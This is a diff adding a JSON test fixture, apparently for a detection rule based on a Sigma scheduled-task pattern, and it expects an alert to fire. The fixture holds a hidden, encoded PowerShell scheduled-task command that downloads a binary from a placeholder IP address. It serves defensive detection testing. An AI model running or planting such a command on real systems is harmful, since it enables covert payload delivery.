@@ -1,0 +1,8 @@
+{
+  "label": "malicious",
+  "source": "Sigma schtasks_susp_pattern DownloadData",
+  "TaskName": "\\\\Maint\\\\Job",
+  "TaskExecCommand": "powershell.exe",
+  "TaskExecArguments": "-nop -w hidden -enc <b64> -Command (New-Object Net.WebClient).DownloadData('http://203.0.113.5/a.bin')",
+  "expect_alert": true
+}
